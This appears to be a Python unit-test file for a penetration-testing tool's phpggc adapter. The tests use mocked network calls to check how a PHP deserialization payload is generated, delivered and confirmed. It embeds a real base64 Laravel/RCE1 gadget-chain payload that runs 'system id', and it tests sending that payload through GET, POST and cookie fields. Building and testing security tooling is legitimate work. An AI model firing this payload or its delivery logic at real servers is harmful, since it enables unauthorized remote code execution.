"""
Unit tests for the phpggc adapter and tool layer.
All subprocess and HTTP calls are mocked; no live target traffic.

The payload fixture below is real captured output from
`php phpggc Laravel/RCE1 system id | base64 -w0` against the phpggc
release installed on CT 115, and the unknown-chain error below is the
real stdout phpggc emits with exit code 1 -- not a hand-typed shape.
"""
from __future__ import annotations

import base64
import subprocess
import urllib.parse
from unittest.mock import MagicMock

import requests

from tradecraft.adapters.phpggc import execute as phpggc_execute
from tradecraft.adapters.phpggc import parse as phpggc_parse
from tradecraft.tools.phpggc import Phpggc

REAL_LARAVEL_PAYLOAD_B64 = (
    "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIA"
    "KgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7"
    "YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjI6Imlk"
    "Ijt9Cg=="
)
REAL_LARAVEL_PAYLOAD = base64.b64decode(REAL_LARAVEL_PAYLOAD_B64)
REAL_UNKNOWN_CHAIN_STDOUT = b"ERROR: Unknown gadget chain: laravel/nosuchchain\n"
REAL_ID_OUTPUT = "uid=33(www-data) gid=33(www-data) groups=33(www-data)"

SCRIPT = "/opt/phpggc/phpggc"


def _resp(status: int, text: str = ""):
    response = MagicMock()
    response.status_code = status
    response.text = text
    return response


def _completed(stdout: bytes = b"", stderr: bytes = b"", returncode: int = 0):
    proc = MagicMock()
    proc.stdout = stdout
    proc.stderr = stderr
    proc.returncode = returncode
    return proc


def _patch_generation(monkeypatch, proc):
    monkeypatch.setattr(phpggc_execute, "find_script", lambda: SCRIPT)
    run = MagicMock(return_value=proc)
    monkeypatch.setattr(phpggc_execute.subprocess, "run", run)
    return run


def test_framework_aliases_map_to_real_rce_chains():
    assert phpggc_parse.select_gadget_chain("laravel") == ("Laravel/RCE1", None)
    assert phpggc_parse.select_gadget_chain("Symfony") == ("Symfony/RCE4", None)
    assert phpggc_parse.select_gadget_chain("monolog") == ("Monolog/RCE1", None)
    assert phpggc_parse.select_gadget_chain("guzzle") == ("Guzzle/RCE1", None)
    assert phpggc_parse.select_gadget_chain("") == ("Laravel/RCE1", None)


def test_exact_chain_name_passes_through_but_flags_do_not():
    assert phpggc_parse.select_gadget_chain("Laravel/RCE22") == ("Laravel/RCE22", None)
    assert phpggc_parse.select_gadget_chain("Drupal/PsySH/INFO1") == (
        "Drupal/PsySH/INFO1",
        None,
    )
    chain, error = phpggc_parse.select_gadget_chain("--help")
    assert chain == ""
    assert "unknown framework" in error


def test_unknown_framework_is_an_error_not_a_silent_default():
    chain, error = phpggc_parse.select_gadget_chain("wordpress")
    assert chain == ""
    assert "unknown framework" in error
    assert "laravel" in error


def test_normalize_method_accepts_three_delivery_modes_only():
    assert phpggc_parse.normalize_method("") == ("GET", None)
    assert phpggc_parse.normalize_method("post") == ("POST", None)
    assert phpggc_parse.normalize_method("Cookie") == ("COOKIE", None)
    method, error = phpggc_parse.normalize_method("PUT")
    assert method == ""
    assert "unsupported method" in error


def test_build_phpggc_argv_matches_real_cli_invocation():
    assert phpggc_parse.build_phpggc_argv(SCRIPT, "Laravel/RCE1") == [
        "php",
        SCRIPT,
        "Laravel/RCE1",
        "system",
        "id",
    ]


def test_check_confirmation_only_on_real_id_output():
    confirmed, snippet = phpggc_parse.check_confirmation(
        f"<html>ok</html>{REAL_ID_OUTPUT}"
    )
    assert confirmed is True
    assert REAL_ID_OUTPUT in snippet

    assert phpggc_parse.check_confirmation("<html>404 Not Found</html>") == (False, "")
    assert phpggc_parse.check_confirmation("payload echoed: O:40:\"...\"") == (False, "")
    assert phpggc_parse.check_confirmation("") == (False, "")


def test_parse_host_port_and_url_normalization():
    assert phpggc_parse.parse_host_port("https://target.test/profile") == (
        "target.test",
        443,
    )
    assert phpggc_parse.parse_host_port("http://target.test:8080/x") == (
        "target.test",
        8080,
    )
    assert phpggc_parse.normalize_target_url("target.test/x") == "http://target.test/x"
    assert phpggc_parse.normalize_target_url("  ") == ""


def test_get_delivery_sends_real_payload_once_and_confirms(monkeypatch):
    run = _patch_generation(monkeypatch, _completed(stdout=REAL_LARAVEL_PAYLOAD))
    session = MagicMock()
    session.get.return_value = _resp(200, f"<html>{REAL_ID_OUTPUT}</html>")

    raw = phpggc_execute.execute(
        "https://target.test/profile?data=abc",
        "data",
        framework="laravel",
        session=session,
    )

    assert run.call_args.args[0] == ["php", SCRIPT, "Laravel/RCE1", "system", "id"]
    assert raw.payload_b64 == REAL_LARAVEL_PAYLOAD_B64
    assert session.get.call_count == 1
    kwargs = session.get.call_args.kwargs
    assert kwargs["params"] == {"data": REAL_LARAVEL_PAYLOAD_B64}
    assert kwargs["allow_redirects"] is False

    parsed = phpggc_parse.parse_result(raw)
    assert parsed["vulnerable"] is True
    assert parsed["gadget"] == "Laravel/RCE1"
    assert parsed["parameter"] == "data"
    assert REAL_ID_OUTPUT in parsed["snippet"]
    assert "payload_b64" not in parsed


def test_post_delivery_uses_form_body_and_existing_session_cookie(monkeypatch):
    _patch_generation(monkeypatch, _completed(stdout=REAL_LARAVEL_PAYLOAD))
    session = MagicMock()
    session.post.return_value = _resp(200, "no execution")

    raw = phpggc_execute.execute(
        "https://target.test/api",
        "payload",
        method="POST",
        cookie="session=abc123",
        session=session,
    )

    assert session.post.call_count == 1
    kwargs = session.post.call_args.kwargs
    assert kwargs["data"] == {"payload": REAL_LARAVEL_PAYLOAD_B64}
    assert kwargs["headers"]["Cookie"] == "session=abc123"
    assert phpggc_parse.parse_result(raw)["vulnerable"] is False


def test_cookie_delivery_appends_payload_to_existing_cookie(monkeypatch):
    _patch_generation(monkeypatch, _completed(stdout=REAL_LARAVEL_PAYLOAD))
    session = MagicMock()
    session.get.return_value = _resp(200, REAL_ID_OUTPUT)

    phpggc_execute.execute(
        "https://target.test/dashboard",
        "prefs",
        method="COOKIE",
        cookie="session=abc123; theme=dark",
        session=session,
    )

    kwargs = session.get.call_args.kwargs
    expected_pair = f"prefs={urllib.parse.quote_plus(REAL_LARAVEL_PAYLOAD_B64)}"
    assert kwargs["headers"]["Cookie"] == f"session=abc123; theme=dark; {expected_pair}"
    assert "params" not in kwargs


def test_phpggc_nonzero_exit_reports_stdout_error(monkeypatch):
    _patch_generation(
        monkeypatch,
        _completed(stdout=REAL_UNKNOWN_CHAIN_STDOUT, stderr=b"", returncode=1),
    )
    session = MagicMock()

    raw = phpggc_execute.execute(
        "https://target.test", "data", framework="Laravel/NoSuchChain", session=session
    )

    # Regression: the original adapter read stderr only, and phpggc's own
    # "ERROR: ..." text goes to stdout -- the error message was empty.
    assert "Unknown gadget chain" in raw.error
    assert "exit 1" in raw.error
    session.get.assert_not_called()
    session.post.assert_not_called()


def test_phpggc_timeout_is_reported_without_delivery(monkeypatch):
    monkeypatch.setattr(phpggc_execute, "find_script", lambda: SCRIPT)
    monkeypatch.setattr(
        phpggc_execute.subprocess,
        "run",
        MagicMock(side_effect=subprocess.TimeoutExpired(cmd="php", timeout=10)),
    )
    session = MagicMock()

    raw = phpggc_execute.execute("https://target.test", "data", session=session)

    assert "timed out" in raw.error
    session.get.assert_not_called()


def test_missing_php_binary_is_reported_without_delivery(monkeypatch):
    monkeypatch.setattr(phpggc_execute, "find_script", lambda: SCRIPT)
    monkeypatch.setattr(
        phpggc_execute.subprocess,
        "run",
        MagicMock(side_effect=FileNotFoundError("php")),
    )
    session = MagicMock()

    raw = phpggc_execute.execute("https://target.test", "data", session=session)

    assert "php executable not found" in raw.error
    session.get.assert_not_called()


def test_empty_generated_payload_is_an_error(monkeypatch):
    _patch_generation(monkeypatch, _completed(stdout=b"\n"))
    session = MagicMock()

    raw = phpggc_execute.execute("https://target.test", "data", session=session)

    assert "empty payload" in raw.error
    session.get.assert_not_called()


def test_oversized_generated_payload_is_rejected(monkeypatch):
    oversized = b"A" * (phpggc_execute.MAX_PAYLOAD_BYTES + 1)
    _patch_generation(monkeypatch, _completed(stdout=oversized))
    session = MagicMock()

    raw = phpggc_execute.execute("https://target.test", "data", session=session)

    assert "over the" in raw.error
    session.get.assert_not_called()


def test_missing_script_is_reported(monkeypatch):
    monkeypatch.setattr(phpggc_execute, "find_script", lambda: None)
    session = MagicMock()

    raw = phpggc_execute.execute("https://target.test", "data", session=session)

    assert "phpggc script not found" in raw.error
    session.get.assert_not_called()


def test_http_failure_is_reported_without_second_request(monkeypatch):
    _patch_generation(monkeypatch, _completed(stdout=REAL_LARAVEL_PAYLOAD))
    session = MagicMock()
    session.get.side_effect = requests.ConnectionError("refused")

    raw = phpggc_execute.execute("https://target.test", "data", session=session)

    assert "HTTP request failed" in raw.error
    assert session.get.call_count == 1


def test_find_script_env_override(tmp_path, monkeypatch):
    script = tmp_path / "phpggc"
    script.write_text("#!/usr/bin/env php\n")
    monkeypatch.setenv(phpggc_execute.PHPGGC_SCRIPT_ENV, str(script))
    assert phpggc_execute.find_script() == str(script)


def test_find_script_absent(monkeypatch):
    monkeypatch.delenv(phpggc_execute.PHPGGC_SCRIPT_ENV, raising=False)
    monkeypatch.setattr(phpggc_execute, "PHPGGC_SCRIPT_PATH", "/nonexistent/phpggc")
    assert phpggc_execute.find_script() is None


def test_tool_is_destructive_and_uses_php_binary():
    tool = Phpggc()
    assert tool.tool_id == "phpggc"
    assert tool.destructive is True
    assert tool.required_binary == "php"
    assert tool.scope_param == "target"


def test_phpggc_excluded_by_default_and_included_with_allow_destructive(monkeypatch):
    """The real tool's contract flag -- not just the dummy-tool fixture in
    tests/test_destructive_tools_excluded.py -- must drive the runtime
    gate. is_available is forced True so this doesn't depend on phpggc
    being installed on the test host."""
    from tradecraft.execution.loop import _build_tool_map
    from tradecraft.memory.log import EngagementMemory

    monkeypatch.setattr(Phpggc, "is_available", lambda self: True)
    memory = EngagementMemory()

    assert "phpggc" not in _build_tool_map(memory, tool_ids=["phpggc"])
    assert "phpggc" in _build_tool_map(
        memory, tool_ids=["phpggc"], allow_destructive=True
    )



def test_tool_run_confirmed_facts_and_evidence(monkeypatch):
    _patch_generation(monkeypatch, _completed(stdout=REAL_LARAVEL_PAYLOAD))
    session = MagicMock()
    session.get.return_value = _resp(200, REAL_ID_OUTPUT)
    original_execute = phpggc_execute.execute
    monkeypatch.setattr(
        phpggc_execute,
        "execute",
        lambda **kwargs: original_execute(session=session, **kwargs),
    )

    tool = Phpggc()
    params = {"target": "https://target.test/profile", "parameter": "data"}
    result = tool.run(**params)

    assert result["vulnerable"] is True
    assert result["gadget"] == "Laravel/RCE1"

    facts = tool.extract_facts(params, result)
    assert facts == [
        {
            "host": "target.test",
            "port": 443,
            "php_deserialization_rce": True,
            "phpggc_gadget": "Laravel/RCE1",
            "phpggc_parameter": "data",
        }
    ]

    host, evidence = tool.extract_evidence(params, result)
    assert host == "target.test"
    assert evidence["payload_b64"] == REAL_LARAVEL_PAYLOAD_B64
    assert evidence["gadget"] == "Laravel/RCE1"
    assert "_full_evidence" not in result


def test_tool_no_facts_or_evidence_on_clean_result(monkeypatch):
    _patch_generation(monkeypatch, _completed(stdout=REAL_LARAVEL_PAYLOAD))
    session = MagicMock()
    session.get.return_value = _resp(200, "<html>nothing here</html>")
    original_execute = phpggc_execute.execute
    monkeypatch.setattr(
        phpggc_execute,
        "execute",
        lambda **kwargs: original_execute(session=session, **kwargs),
    )

    tool = Phpggc()
    params = {"target": "https://target.test/profile", "parameter": "data"}
    result = tool.run(**params)

    assert result["vulnerable"] is False
    assert result["error"] is None
    assert tool.extract_facts(params, result) == []
    assert tool.extract_evidence(params, result) is None


def test_tool_no_facts_or_evidence_on_error(monkeypatch):
    _patch_generation(
        monkeypatch,
        _completed(stdout=REAL_UNKNOWN_CHAIN_STDOUT, stderr=b"", returncode=1),
    )

    tool = Phpggc()
    params = {"target": "https://target.test/profile", "parameter": "data"}
    result = tool.run(**params)

    assert "Unknown gadget chain" in result["error"]
    assert tool.extract_facts(params, result) == []
    assert tool.extract_evidence(params, result) is None
